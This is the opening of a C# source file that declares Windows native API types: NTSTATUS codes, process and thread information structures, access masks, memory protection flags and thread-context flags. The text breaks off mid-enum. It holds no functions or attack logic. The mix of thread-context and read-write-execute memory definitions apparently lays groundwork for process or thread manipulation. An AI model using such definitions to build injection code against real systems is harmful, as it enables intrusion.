using System;
using System.Security;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Runtime.ConstrainedExecution;
using System.Management;
using System.Security.Principal;
using System.Collections.Generic;
using System.ComponentModel;
using System.Security.Permissions;
using Microsoft.Win32.SafeHandles;
using System.Linq;
using System.Reflection;
using System.Security.AccessControl;
using System.Text;
using System.Threading;
using System.Security.Cryptography;
using System.IO;

public class Code
{

	    public enum NTSTATUS : uint
	    {
	        Success = 0x00000000,
	        Wait0 = 0x00000000,
	        Wait1 = 0x00000001,
	        Wait2 = 0x00000002,
	        Wait3 = 0x00000003,
	        Wait63 = 0x0000003f,
	        Abandoned = 0x00000080,
	        AbandonedWait0 = 0x00000080,
	        AbandonedWait1 = 0x00000081,
	        AbandonedWait2 = 0x00000082,
	        AbandonedWait3 = 0x00000083,
	        AbandonedWait63 = 0x000000bf,
	        UserApc = 0x000000c0,
	        KernelApc = 0x00000100,
	        Alerted = 0x00000101,
	        Timeout = 0x00000102,
	        Pending = 0x00000103,
	        Reparse = 0x00000104,
	        MoreEntries = 0x00000105,
	        NotAllAssigned = 0x00000106,
	        SomeNotMapped = 0x00000107,
	        OpLockBreakInProgress = 0x00000108,
	        VolumeMounted = 0x00000109,
	        RxActCommitted = 0x0000010a,
	        NotifyCleanup = 0x0000010b,
	        NotifyEnumDir = 0x0000010c,
	        NoQuotasForAccount = 0x0000010d,
	        PrimaryTransportConnectFailed = 0x0000010e,
	        PageFaultTransition = 0x00000110,
	        PageFaultDemandZero = 0x00000111,
	        PageFaultCopyOnWrite = 0x00000112,
	        PageFaultGuardPage = 0x00000113,
	        PageFaultPagingFile = 0x00000114,
	        CrashDump = 0x00000116,
	        ReparseObject = 0x00000118,
	        NothingToTerminate = 0x00000122,
	        ProcessNotInJob = 0x00000123,
	        ProcessInJob = 0x00000124,
	        ProcessCloned = 0x00000129,
	        FileLockedWithOnlyReaders = 0x0000012a,
	        FileLockedWithWriters = 0x0000012b,
	        Informational = 0x40000000,
	        ObjectNameExists = 0x40000000,
	        ThreadWasSuspended = 0x40000001,
	        WorkingSetLimitRange = 0x40000002,
	        ImageNotAtBase = 0x40000003,
	        RegistryRecovered = 0x40000009,
	        Warning = 0x80000000,
	        GuardPageViolation = 0x80000001,
	        DatatypeMisalignment = 0x80000002,
	        Breakpoint = 0x80000003,
	        SingleStep = 0x80000004,
	        BufferOverflow = 0x80000005,
	        NoMoreFiles = 0x80000006,
	        HandlesClosed = 0x8000000a,
	        PartialCopy = 0x8000000d,
	        DeviceBusy = 0x80000011,
	        InvalidEaName = 0x80000013,
	        EaListInconsistent = 0x80000014,
	        NoMoreEntries = 0x8000001a,
	        LongJump = 0x80000026,
	        DllMightBeInsecure = 0x8000002b,
	        Error = 0xc0000000,
	        Unsuccessful = 0xc0000001,
	        NotImplemented = 0xc0000002,
	        InvalidInfoClass = 0xc0000003,
	        InfoLengthMismatch = 0xc0000004,
	        AccessViolation = 0xc0000005,
	        InPageError = 0xc0000006,
	        PagefileQuota = 0xc0000007,
	        InvalidHandle = 0xc0000008,
	        BadInitialStack = 0xc0000009,
	        BadInitialPc = 0xc000000a,
	        InvalidCid = 0xc000000b,
	        TimerNotCanceled = 0xc000000c,
	        InvalidParameter = 0xc000000d,
	        NoSuchDevice = 0xc000000e,
	        NoSuchFile = 0xc000000f,
	        InvalidDeviceRequest = 0xc0000010,
	        EndOfFile = 0xc0000011,
	        WrongVolume = 0xc0000012,
	        NoMediaInDevice = 0xc0000013,
	        NoMemory = 0xc0000017,
	        ConflictingAddresses = 0xc0000018,
	        NotMappedView = 0xc0000019,
	        UnableToFreeVm = 0xc000001a,
	        UnableToDeleteSection = 0xc000001b,
	        IllegalInstruction = 0xc000001d,
	        AlreadyCommitted = 0xc0000021,
	        AccessDenied = 0xc0000022,
	        BufferTooSmall = 0xc0000023,
	        ObjectTypeMismatch = 0xc0000024,
	        NonContinuableException = 0xc0000025,
	        BadStack = 0xc0000028,
	        NotLocked = 0xc000002a,
	        NotCommitted = 0xc000002d,
	        InvalidParameterMix = 0xc0000030,
	        ObjectNameInvalid = 0xc0000033,
	        ObjectNameNotFound = 0xc0000034,
	        ObjectNameCollision = 0xc0000035,
	        ObjectPathInvalid = 0xc0000039,
	        ObjectPathNotFound = 0xc000003a,
	        ObjectPathSyntaxBad = 0xc000003b,
	        DataOverrun = 0xc000003c,
	        DataLate = 0xc000003d,
	        DataError = 0xc000003e,
	        CrcError = 0xc000003f,
	        SectionTooBig = 0xc0000040,
	        PortConnectionRefused = 0xc0000041,
	        InvalidPortHandle = 0xc0000042,
	        SharingViolation = 0xc0000043,
	        QuotaExceeded = 0xc0000044,
	        InvalidPageProtection = 0xc0000045,
	        MutantNotOwned = 0xc0000046,
	        SemaphoreLimitExceeded = 0xc0000047,
	        PortAlreadySet = 0xc0000048,
	        SectionNotImage = 0xc0000049,
	        SuspendCountExceeded = 0xc000004a,
	        ThreadIsTerminating = 0xc000004b,
	        BadWorkingSetLimit = 0xc000004c,
	        IncompatibleFileMap = 0xc000004d,
	        SectionProtection = 0xc000004e,
	        EasNotSupported = 0xc000004f,
	        EaTooLarge = 0xc0000050,
	        NonExistentEaEntry = 0xc0000051,
	        NoEasOnFile = 0xc0000052,
	        EaCorruptError = 0xc0000053,
	        FileLockConflict = 0xc0000054,
	        LockNotGranted = 0xc0000055,
	        DeletePending = 0xc0000056,
	        CtlFileNotSupported = 0xc0000057,
	        UnknownRevision = 0xc0000058,
	        RevisionMismatch = 0xc0000059,
	        InvalidOwner = 0xc000005a,
	        InvalidPrimaryGroup = 0xc000005b,
	        NoImpersonationToken = 0xc000005c,
	        CantDisableMandatory = 0xc000005d,
	        NoLogonServers = 0xc000005e,
	        NoSuchLogonSession = 0xc000005f,
	        NoSuchPrivilege = 0xc0000060,
	        PrivilegeNotHeld = 0xc0000061,
	        InvalidAccountName = 0xc0000062,
	        UserExists = 0xc0000063,
	        NoSuchUser = 0xc0000064,
	        GroupExists = 0xc0000065,
	        NoSuchGroup = 0xc0000066,
	        MemberInGroup = 0xc0000067,
	        MemberNotInGroup = 0xc0000068,
	        LastAdmin = 0xc0000069,
	        WrongPassword = 0xc000006a,
	        IllFormedPassword = 0xc000006b,
	        PasswordRestriction = 0xc000006c,
	        LogonFailure = 0xc000006d,
	        AccountRestriction = 0xc000006e,
	        InvalidLogonHours = 0xc000006f,
	        InvalidWorkstation = 0xc0000070,
	        PasswordExpired = 0xc0000071,
	        AccountDisabled = 0xc0000072,
	        NoneMapped = 0xc0000073,
	        TooManyLuidsRequested = 0xc0000074,
	        LuidsExhausted = 0xc0000075,
	        InvalidSubAuthority = 0xc0000076,
	        InvalidAcl = 0xc0000077,
	        InvalidSid = 0xc0000078,
	        InvalidSecurityDescr = 0xc0000079,
	        ProcedureNotFound = 0xc000007a,
	        InvalidImageFormat = 0xc000007b,
	        NoToken = 0xc000007c,
	        BadInheritanceAcl = 0xc000007d,
	        RangeNotLocked = 0xc000007e,
	        DiskFull = 0xc000007f,
	        ServerDisabled = 0xc0000080,
	        ServerNotDisabled = 0xc0000081,
	        TooManyGuidsRequested = 0xc0000082,
	        GuidsExhausted = 0xc0000083,
	        InvalidIdAuthority = 0xc0000084,
	        AgentsExhausted = 0xc0000085,
	        InvalidVolumeLabel = 0xc0000086,
	        SectionNotExtended = 0xc0000087,
	        NotMappedData = 0xc0000088,
	        ResourceDataNotFound = 0xc0000089,
	        ResourceTypeNotFound = 0xc000008a,
	        ResourceNameNotFound = 0xc000008b,
	        ArrayBoundsExceeded = 0xc000008c,
	        FloatDenormalOperand = 0xc000008d,
	        FloatDivideByZero = 0xc000008e,
	        FloatInexactResult = 0xc000008f,
	        FloatInvalidOperation = 0xc0000090,
	        FloatOverflow = 0xc0000091,
	        FloatStackCheck = 0xc0000092,
	        FloatUnderflow = 0xc0000093,
	        IntegerDivideByZero = 0xc0000094,
	        IntegerOverflow = 0xc0000095,
	        PrivilegedInstruction = 0xc0000096,
	        TooManyPagingFiles = 0xc0000097,
	        FileInvalid = 0xc0000098,
	        InstanceNotAvailable = 0xc00000ab,
	        PipeNotAvailable = 0xc00000ac,
	        InvalidPipeState = 0xc00000ad,
	        PipeBusy = 0xc00000ae,
	        IllegalFunction = 0xc00000af,
	        PipeDisconnected = 0xc00000b0,
	        PipeClosing = 0xc00000b1,
	        PipeConnected = 0xc00000b2,
	        PipeListening = 0xc00000b3,
	        InvalidReadMode = 0xc00000b4,
	        IoTimeout = 0xc00000b5,
	        FileForcedClosed = 0xc00000b6,
	        ProfilingNotStarted = 0xc00000b7,
	        ProfilingNotStopped = 0xc00000b8,
	        NotSameDevice = 0xc00000d4,
	        FileRenamed = 0xc00000d5,
	        CantWait = 0xc00000d8,
	        PipeEmpty = 0xc00000d9,
	        CantTerminateSelf = 0xc00000db,
	        InternalError = 0xc00000e5,
	        InvalidParameter1 = 0xc00000ef,
	        InvalidParameter2 = 0xc00000f0,
	        InvalidParameter3 = 0xc00000f1,
	        InvalidParameter4 = 0xc00000f2,
	        InvalidParameter5 = 0xc00000f3,
	        InvalidParameter6 = 0xc00000f4,
	        InvalidParameter7 = 0xc00000f5,
	        InvalidParameter8 = 0xc00000f6,
	        InvalidParameter9 = 0xc00000f7,
	        InvalidParameter10 = 0xc00000f8,
	        InvalidParameter11 = 0xc00000f9,
	        InvalidParameter12 = 0xc00000fa,
	        MappedFileSizeZero = 0xc000011e,
	        TooManyOpenedFiles = 0xc000011f,
	        Cancelled = 0xc0000120,
	        CannotDelete = 0xc0000121,
	        InvalidComputerName = 0xc0000122,
	        FileDeleted = 0xc0000123,
	        SpecialAccount = 0xc0000124,
	        SpecialGroup = 0xc0000125,
	        SpecialUser = 0xc0000126,
	        MembersPrimaryGroup = 0xc0000127,
	        FileClosed = 0xc0000128,
	        TooManyThreads = 0xc0000129,
	        ThreadNotInProcess = 0xc000012a,
	        TokenAlreadyInUse = 0xc000012b,
	        PagefileQuotaExceeded = 0xc000012c,
	        CommitmentLimit = 0xc000012d,
	        InvalidImageLeFormat = 0xc000012e,
	        InvalidImageNotMz = 0xc000012f,
	        InvalidImageProtect = 0xc0000130,
	        InvalidImageWin16 = 0xc0000131,
	        LogonServer = 0xc0000132,
	        DifferenceAtDc = 0xc0000133,
	        SynchronizationRequired = 0xc0000134,
	        DllNotFound = 0xc0000135,
	        IoPrivilegeFailed = 0xc0000137,
	        OrdinalNotFound = 0xc0000138,
	        EntryPointNotFound = 0xc0000139,
	        ControlCExit = 0xc000013a,
	        PortNotSet = 0xc0000353,
	        DebuggerInactive = 0xc0000354,
	        CallbackBypass = 0xc0000503,
	        PortClosed = 0xc0000700,
	        MessageLost = 0xc0000701,
	        InvalidMessage = 0xc0000702,
	        RequestCanceled = 0xc0000703,
	        RecursiveDispatch = 0xc0000704,
	        LpcReceiveBufferExpected = 0xc0000705,
	        LpcInvalidConnectionUsage = 0xc0000706,
	        LpcRequestsNotAllowed = 0xc0000707,
	        ResourceInUse = 0xc0000708,
	        ProcessIsProtected = 0xc0000712,
	        VolumeDirty = 0xc0000806,
	        FileCheckedOut = 0xc0000901,
	        CheckOutRequired = 0xc0000902,
	        BadFileType = 0xc0000903,
	        FileTooLarge = 0xc0000904,
	        FormsAuthRequired = 0xc0000905,
	        VirusInfected = 0xc0000906,
	        VirusDeleted = 0xc0000907,
	        TransactionalConflict = 0xc0190001,
	        InvalidTransaction = 0xc0190002,
	        TransactionNotActive = 0xc0190003,
	        TmInitializationFailed = 0xc0190004,
	        RmNotActive = 0xc0190005,
	        RmMetadataCorrupt = 0xc0190006,
	        TransactionNotJoined = 0xc0190007,
	        DirectoryNotRm = 0xc0190008,
	        CouldNotResizeLog = 0xc0190009,
	        TransactionsUnsupportedRemote = 0xc019000a,
	        LogResizeInvalidSize = 0xc019000b,
	        RemoteFileVersionMismatch = 0xc019000c,
	        CrmProtocolAlreadyExists = 0xc019000f,
	        TransactionPropagationFailed = 0xc0190010,
	        CrmProtocolNotFound = 0xc0190011,
	        TransactionSuperiorExists = 0xc0190012,
	        TransactionRequestNotValid = 0xc0190013,
	        TransactionNotRequested = 0xc0190014,
	        TransactionAlreadyAborted = 0xc0190015,
	        TransactionAlreadyCommitted = 0xc0190016,
	        TransactionInvalidMarshallBuffer = 0xc0190017,
	        CurrentTransactionNotValid = 0xc0190018,
	        LogGrowthFailed = 0xc0190019,
	        ObjectNoLongerExists = 0xc0190021,
	        StreamMiniversionNotFound = 0xc0190022,
	        StreamMiniversionNotValid = 0xc0190023,
	        MiniversionInaccessibleFromSpecifiedTransaction = 0xc0190024,
	        CantOpenMiniversionWithModifyIntent = 0xc0190025,
	        CantCreateMoreStreamMiniversions = 0xc0190026,
	        HandleNoLongerValid = 0xc0190028,
	        NoTxfMetadata = 0xc0190029,
	        LogCorruptionDetected = 0xc0190030,
	        CantRecoverWithHandleOpen = 0xc0190031,
	        RmDisconnected = 0xc0190032,
	        EnlistmentNotSuperior = 0xc0190033,
	        RecoveryNotNeeded = 0xc0190034,
	        RmAlreadyStarted = 0xc0190035,
	        FileIdentityNotPersistent = 0xc0190036,
	        CantBreakTransactionalDependency = 0xc0190037,
	        CantCrossRmBoundary = 0xc0190038,
	        TxfDirNotEmpty = 0xc0190039,
	        IndoubtTransactionsExist = 0xc019003a,
	        TmVolatile = 0xc019003b,
	        RollbackTimerExpired = 0xc019003c,
	        TxfAttributeCorrupt = 0xc019003d,
	        EfsNotAllowedInTransaction = 0xc019003e,
	        TransactionalOpenNotAllowed = 0xc019003f,
	        TransactedMappingUnsupportedRemote = 0xc0190040,
	        TxfMetadataAlreadyPresent = 0xc0190041,
	        TransactionScopeCallbacksNotSet = 0xc0190042,
	        TransactionRequiredPromotion = 0xc0190043,
	        CannotExecuteFileInTransaction = 0xc0190044,
	        TransactionsNotFrozen = 0xc0190045,
	        MaximumNtStatus = 0xffffffff
	};


	        [StructLayout(LayoutKind.Sequential)]
	        public struct SYSTEM_PROCESSES
	        {
	            public int NextEntryOffset;
	            public int NumberOfThreads;
	            public LARGE_INTEGER WorkingSetPrivateSize;
	            public uint HardFaultCount;
	            public uint NumberOfThreadsHighWatermark;
	            public ulong CycleTime;
	            public long CreateTime;
	            public long UserTime;
	            public long KernelTime;
	            public UNICODE_STRING ImageName;
	            public int BasePriority;
	            public IntPtr UniqueProcessId;
	            public IntPtr InheritedFromUniqueProcessId;
	            public int HandleCount;
	            public int SessionId;
	            public IntPtr UniqueProcessKey;
	            public IntPtr PeakVirtualSize;
	            public IntPtr VirtualSize;
	            public uint PageFaultCount;
	            public IntPtr PeakWorkingSetSize;
	            public IntPtr WorkingSetSize;
	            public IntPtr QuotaPeakPagedPoolUsage;
	            public IntPtr QuotaPagedPoolUsage;
	            public IntPtr QuotaPeakNonPagedPoolUsage;
	            public IntPtr QuotaNonPagedPoolUsage;
	            public IntPtr PagefileUsage;
	            public IntPtr PeakPagefileUsage;
	            public IntPtr PrivatePageCount;
	            public LARGE_INTEGER ReadOperationCount;
	            public LARGE_INTEGER WriteOperationCount;
	            public LARGE_INTEGER OtherOperationCount;
	            public LARGE_INTEGER ReadTransferCount;
	            public LARGE_INTEGER WriteTransferCount;
	            public LARGE_INTEGER OtherTransferCount;
	        }

					[StructLayout(LayoutKind.Sequential)]
	        public struct LARGE_INTEGER
	        {
	            public UInt32 LowPart;
	            public UInt32 HighPart;
	        }

					[Flags]
					public enum ACCESS_MASK : uint
					{
						DELETE = 0x00010000,
						READ_CONTROL = 0x00020000,
						WRITE_DAC = 0x00040000,
						WRITE_OWNER = 0x00080000,
						SYNCHRONIZE = 0x00100000,
						STANDARD_RIGHTS_REQUIRED = 0x000F0000,
						STANDARD_RIGHTS_READ = 0x00020000,
						STANDARD_RIGHTS_WRITE = 0x00020000,
						STANDARD_RIGHTS_EXECUTE = 0x00020000,
						STANDARD_RIGHTS_ALL = 0x001F0000,
						SPECIFIC_RIGHTS_ALL = 0x0000FFFF,
						ACCESS_SYSTEM_SECURITY = 0x01000000,
						MAXIMUM_ALLOWED = 0x02000000,
						GENERIC_READ = 0x80000000,
						GENERIC_WRITE = 0x40000000,
						GENERIC_EXECUTE = 0x20000000,
						GENERIC_ALL = 0x10000000,
						DESKTOP_READOBJECTS = 0x00000001,
						DESKTOP_CREATEWINDOW = 0x00000002,
						DESKTOP_CREATEMENU = 0x00000004,
						DESKTOP_HOOKCONTROL = 0x00000008,
						DESKTOP_JOURNALRECORD = 0x00000010,
						DESKTOP_JOURNALPLAYBACK = 0x00000020,
						DESKTOP_ENUMERATE = 0x00000040,
						DESKTOP_WRITEOBJECTS = 0x00000080,
						DESKTOP_SWITCHDESKTOP = 0x00000100,
						WINSTA_ENUMDESKTOPS = 0x00000001,
						WINSTA_READATTRIBUTES = 0x00000002,
						WINSTA_ACCESSCLIPBOARD = 0x00000004,
						WINSTA_CREATEDESKTOP = 0x00000008,
						WINSTA_WRITEATTRIBUTES = 0x00000010,
						WINSTA_ACCESSGLOBALATOMS = 0x00000020,
						WINSTA_EXITWINDOWS = 0x00000040,
						WINSTA_ENUMERATE = 0x00000100,
						WINSTA_READSCREEN = 0x00000200,
						WINSTA_ALL_ACCESS = 0x0000037F
					}


	        public enum SYSTEM_INFORMATION_CLASS
	        {
	            SystemBasicInformation =                                0x00,
	            SystemProcessorInformation =                            0x01,
	            SystemPerformanceInformation =                          0x02,
	            SystemTimeOfDayInformation =                            0x03,
	            SystemPathInformation =                                 0x04,
	            SystemProcessInformation =                              0x05,
	            SystemCallCountInformation =                            0x06,
	            SystemDeviceInformation =                               0x07,
	            SystemProcessorPerformanceInformation =                 0x08,
	            SystemFlagsInformation =                                0x09,
	            SystemCallTimeInformation =                             0x0A,
	            SystemModuleInformation =                               0x0B,
	            SystemLocksInformation =                                0x0C,
	            SystemStackTraceInformation =                           0x0D,
	            SystemPagedPoolInformation =                            0x0E,
	            SystemNonPagedPoolInformation =                         0x0F,
	            SystemHandleInformation =                               0x10,
	            SystemObjectInformation =                               0x11,
	            SystemPageFileInformation =                             0x12,
	            SystemVdmInstemulInformation =                          0x13,
	            SystemVdmBopInformation =                               0x14,
	            SystemFileCacheInformation =                            0x15,
	            SystemPoolTagInformation =                              0x16,
	            SystemInterruptInformation =                            0x17,
	            SystemDpcBehaviorInformation =                          0x18,
	            SystemFullMemoryInformation =                           0x19,
	            SystemLoadGdiDriverInformation =                        0x1A,
	            SystemUnloadGdiDriverInformation =                      0x1B,
	            SystemTimeAdjustmentInformation =                       0x1C,
	            SystemSummaryMemoryInformation =                        0x1D,
	            SystemMirrorMemoryInformation =                         0x1E,
	            SystemPerformanceTraceInformation =                     0x1F,
	            SystemObsolete0 =                                       0x20,
	            SystemExceptionInformation =                            0x21,
	            SystemCrashDumpStateInformation =                       0x22,
	            SystemKernelDebuggerInformation =                       0x23,
	            SystemContextSwitchInformation =                        0x24,
	            SystemRegistryQuotaInformation =                        0x25,
	            SystemExtendServiceTableInformation =                   0x26,
	            SystemPrioritySeperation =                              0x27,
	            SystemVerifierAddDriverInformation =                    0x28,
	            SystemVerifierRemoveDriverInformation =                 0x29,
	            SystemProcessorIdleInformation =                        0x2A,
	            SystemLegacyDriverInformation =                         0x2B,
	            SystemCurrentTimeZoneInformation =                      0x2C,
	            SystemLookasideInformation =                            0x2D,
	            SystemTimeSlipNotification =                            0x2E,
	            SystemSessionCreate =                                   0x2F,
	            SystemSessionDetach =                                   0x30,
	            SystemSessionInformation =                              0x31,
	            SystemRangeStartInformation =                           0x32,
	            SystemVerifierInformation =                             0x33,
	            SystemVerifierThunkExtend =                             0x34,
	            SystemSessionProcessInformation =                       0x35,
	            SystemLoadGdiDriverInSystemSpace =                      0x36,
	            SystemNumaProcessorMap =                                0x37,
	            SystemPrefetcherInformation =                           0x38,
	            SystemExtendedProcessInformation =                      0x39,
	            SystemRecommendedSharedDataAlignment =                  0x3A,
	            SystemComPlusPackage =                                  0x3B,
	            SystemNumaAvailableMemory =                             0x3C,
	            SystemProcessorPowerInformation =                       0x3D,
	            SystemEmulationBasicInformation =                       0x3E,
	            SystemEmulationProcessorInformation =                   0x3F,
	            SystemExtendedHandleInformation =                       0x40,
	            SystemLostDelayedWriteInformation =                     0x41,
	            SystemBigPoolInformation =                              0x42,
	            SystemSessionPoolTagInformation =                       0x43,
	            SystemSessionMappedViewInformation =                    0x44,
	            SystemHotpatchInformation =                             0x45,
	            SystemObjectSecurityMode =                              0x46,
	            SystemWatchdogTimerHandler =                            0x47,
	            SystemWatchdogTimerInformation =                        0x48,
	            SystemLogicalProcessorInformation =                     0x49,
	            SystemWow64SharedInformationObsolete =                  0x4A,
	            SystemRegisterFirmwareTableInformationHandler =         0x4B,
	            SystemFirmwareTableInformation =                        0x4C,
	            SystemModuleInformationEx =                             0x4D,
	            SystemVerifierTriageInformation =                       0x4E,
	            SystemSuperfetchInformation =                           0x4F,
	            SystemMemoryListInformation =                           0x50,
	            SystemFileCacheInformationEx =                          0x51,
	            SystemThreadPriorityClientIdInformation =               0x52,
	            SystemProcessorIdleCycleTimeInformation =               0x53,
	            SystemVerifierCancellationInformation =                 0x54,
	            SystemProcessorPowerInformationEx =                     0x55,
	            SystemRefTraceInformation =                             0x56,
	            SystemSpecialPoolInformation =                          0x57,
	            SystemProcessIdInformation =                            0x58,
	            SystemErrorPortInformation =                            0x59,
	            SystemBootEnvironmentInformation =                      0x5A,
	            SystemHypervisorInformation =                           0x5B,
	            SystemVerifierInformationEx =                           0x5C,
	            SystemTimeZoneInformation =                             0x5D,
	            SystemImageFileExecutionOptionsInformation =            0x5E,
	            SystemCoverageInformation =                             0x5F,
	            SystemPrefetchPatchInformation =                        0x60,
	            SystemVerifierFaultsInformation =                       0x61,
	            SystemSystemPartitionInformation =                      0x62,
	            SystemSystemDiskInformation =                           0x63,
	            SystemProcessorPerformanceDistribution =                0x64,
	            SystemNumaProximityNodeInformation =                    0x65,
	            SystemDynamicTimeZoneInformation =                      0x66,
	            SystemCodeIntegrityInformation =                        0x67,
	            SystemProcessorMicrocodeUpdateInformation =             0x68,
	            SystemProcessorBrandString =                            0x69,
	            SystemVirtualAddressInformation =                       0x6A,
	            SystemLogicalProcessorAndGroupInformation =             0x6B,
	            SystemProcessorCycleTimeInformation =                   0x6C,
	            SystemStoreInformation =                                0x6D,
	            SystemRegistryAppendString =                            0x6E,
	            SystemAitSamplingValue =                                0x6F,
	            SystemVhdBootInformation =                              0x70,
	            SystemCpuQuotaInformation =                             0x71,
	            SystemNativeBasicInformation =                          0x72,
	            SystemErrorPortTimeouts =                               0x73,
	            SystemLowPriorityIoInformation =                        0x74,
	            SystemBootEntropyInformation =                          0x75,
	            SystemVerifierCountersInformation =                     0x76,
	            SystemPagedPoolInformationEx =                          0x77,
	            SystemSystemPtesInformationEx =                         0x78,
	            SystemNodeDistanceInformation =                         0x79,
	            SystemAcpiAuditInformation =                            0x7A,
	            SystemBasicPerformanceInformation =                     0x7B,
	            SystemQueryPerformanceCounterInformation =              0x7C,
	            SystemSessionBigPoolInformation =                       0x7D,
	            SystemBootGraphicsInformation =                         0x7E,
	            SystemScrubPhysicalMemoryInformation =                  0x7F,
	            SystemBadPageInformation =                              0x80,
	            SystemProcessorProfileControlArea =                     0x81,
	            SystemCombinePhysicalMemoryInformation =                0x82,
	            SystemEntropyInterruptTimingInformation =               0x83,
	            SystemConsoleInformation =                              0x84,
	            SystemPlatformBinaryInformation =                       0x85,
	            SystemPolicyInformation =                               0x86,
	            SystemHypervisorProcessorCountInformation =             0x87,
	            SystemDeviceDataInformation =                           0x88,
	            SystemDeviceDataEnumerationInformation =                0x89,
	            SystemMemoryTopologyInformation =                       0x8A,
	            SystemMemoryChannelInformation =                        0x8B,
	            SystemBootLogoInformation =                             0x8C,
	            SystemProcessorPerformanceInformationEx =               0x8D,
	            SystemCriticalProcessErrorLogInformation =              0x8E,
	            SystemSecureBootPolicyInformation =                     0x8F,
	            SystemPageFileInformationEx =                           0x90,
	            SystemSecureBootInformation =                           0x91,
	            SystemEntropyInterruptTimingRawInformation =            0x92,
	            SystemPortableWorkspaceEfiLauncherInformation =         0x93,
	            SystemFullProcessInformation =                          0x94,
	            SystemKernelDebuggerInformationEx =                     0x95,
	            SystemBootMetadataInformation =                         0x96,
	            SystemSoftRebootInformation =                           0x97,
	            SystemElamCertificateInformation =                      0x98,
	            SystemOfflineDumpConfigInformation =                    0x99,
	            SystemProcessorFeaturesInformation =                    0x9A,
	            SystemRegistryReconciliationInformation =               0x9B,
	            SystemEdidInformation =                                 0x9C,
	            SystemManufacturingInformation =                        0x9D,
	            SystemEnergyEstimationConfigInformation =               0x9E,
	            SystemHypervisorDetailInformation =                     0x9F,
	            SystemProcessorCycleStatsInformation =                  0xA0,
	            SystemVmGenerationCountInformation =                    0xA1,
	            SystemTrustedPlatformModuleInformation =                0xA2,
	            SystemKernelDebuggerFlags =                             0xA3,
	            SystemCodeIntegrityPolicyInformation =                  0xA4,
	            SystemIsolatedUserModeInformation =                     0xA5,
	            SystemHardwareSecurityTestInterfaceResultsInformation = 0xA6,
	            SystemSingleModuleInformation =                         0xA7,
	            SystemAllowedCpuSetsInformation =                       0xA8,
	            SystemDmaProtectionInformation =                        0xA9,
	            SystemInterruptCpuSetsInformation =                     0xAA,
	            SystemSecureBootPolicyFullInformation =                 0xAB,
	            SystemCodeIntegrityPolicyFullInformation =              0xAC,
	            SystemAffinitizedInterruptProcessorInformation =        0xAD,
	            SystemRootSiloInformation =                             0xAE,
	            SystemCpuSetInformation =                               0xAF,
	            SystemCpuSetTagInformation =                            0xB0,
	            SystemWin32WerStartCallout =                            0xB1,
	            SystemSecureKernelProfileInformation =                  0xB2,
	            SystemCodeIntegrityPlatformManifestInformation =        0xB3,
	            SystemInterruptSteeringInformation =                    0xB4,
	            SystemSuppportedProcessorArchitectures =                0xB5,
	            SystemMemoryUsageInformation =                          0xB6,
	            SystemCodeIntegrityCertificateInformation =             0xB7,
	            SystemPhysicalMemoryInformation =                       0xB8,
	            SystemControlFlowTransition =                           0xB9,
	            SystemKernelDebuggingAllowed =                          0xBA,
	            SystemActivityModerationExeState =                      0xBB,
	            SystemActivityModerationUserSettings =                  0xBC,
	            SystemCodeIntegrityPoliciesFullInformation =            0xBD,
	            SystemCodeIntegrityUnlockInformation =                  0xBE,
	            SystemIntegrityQuotaInformation =                       0xBF,
	            SystemFlushInformation =                                0xC0,
	            SystemProcessorIdleMaskInformation =                    0xC1,
	            SystemSecureDumpEncryptionInformation =                 0xC2,
	            SystemWriteConstraintInformation =                      0xC3,
	            SystemKernelVaShadowInformation =                       0xC4,
	            SystemHypervisorSharedPageInformation =                 0xC5,
	            SystemFirmwareBootPerformanceInformation =              0xC6,
	            SystemCodeIntegrityVerificationInformation =            0xC7,
	            SystemFirmwarePartitionInformation =                    0xC8,
	            SystemSpeculationControlInformation =                   0xC9,
	            SystemDmaGuardPolicyInformation =                       0xCA,
	            SystemEnclaveLaunchControlInformation =                 0xCB,
	            SystemWorkloadAllowedCpuSetsInformation =               0xCC,
	            SystemCodeIntegrityUnlockModeInformation =              0xCD,
	            SystemLeapSecondInformation =                           0xCE,
	            SystemFlags2Information =                               0xCF,
	            SystemSecurityModelInformation =                        0xD0,
	            SystemCodeIntegritySyntheticCacheInformation =          0xD1,
	            MaxSystemInfoClass =                                    0xD2
	        }


	[StructLayout(LayoutKind.Sequential)]
	public struct THREAD_BASIC_INFORMATION
	{
			public uint ExitStatus;
			public uint TebBaseAddress;
			public CLIENT_ID ClientId;
			public uint AffinityMask;
			public uint Priority;
			public uint BasePriority;
	}

	private enum ThreadInfoClass : int
	{
			ThreadBasicInformation = 0,
			ThreadQuerySetWin32StartAddress = 9
	}

	[Flags]
	public enum MemoryProtection : uint
	{
			AccessDenied = 0x0,
			Execute = 0x10,
			ExecuteRead = 0x20,
			ExecuteReadWrite = 0x40,
			ExecuteWriteCopy = 0x80,
			Guard = 0x100,
			NoCache = 0x200,
			WriteCombine = 0x400,
			NoAccess = 0x01,
			ReadOnly = 0x02,
			ReadWrite = 0x04,
			WriteCopy = 0x08,
			MEM_COMMIT = 0x00001000,
			MEM_RESERVE = 0x00002000
	}

	  [Flags]
    public enum ThreadAccess : int
    {
      TERMINATE = (0x0001),
      SUSPEND_RESUME = (0x0002),
      GET_CONTEXT = (0x0008),
      SET_CONTEXT = (0x0010),
      SET_INFORMATION = (0x0020),
      QUERY_INFORMATION = (0x0040),
      SET_THREAD_TOKEN = (0x0080),
      IMPERSONATE = (0x0100),
      DIRECT_IMPERSONATION = (0x0200),
			THREAD_SUSPEND_RESUME_GET_CONTEXT_SET_CONTEXT = SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT,
	    THREAD_SUSPEND = SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT,
	    THREAD_ALL = TERMINATE | SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT | SET_INFORMATION | QUERY_INFORMATION | SET_THREAD_TOKEN | IMPERSONATE | DIRECT_IMPERSONATION
    }

	public enum CONTEXT_FLAGS : uint
	{
	   CONTEXT_i386 = 0x10000,
	   CONTEXT_i486 = 0x10000,
	   CONTEXT_CONTROL = CONTEXT_i386 | 0x01,
	   CONTEXT_INTEGER = CONTEXT_i386 | 0x02,
	   CONTEXT_SEGMENTS = CONTEXT_i386 | 0x04,
	   CONTEXT_FLOATING_POINT = CONTEXT_i386 | 0x08,
	   CONTEXT_DEBUG_REGISTERS = CONTEXT_i386 | 0x10,
	   CONTEXT_EXTENDED_REGISTERS = CONTEXT_i386 | 0x20,
	   CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS,
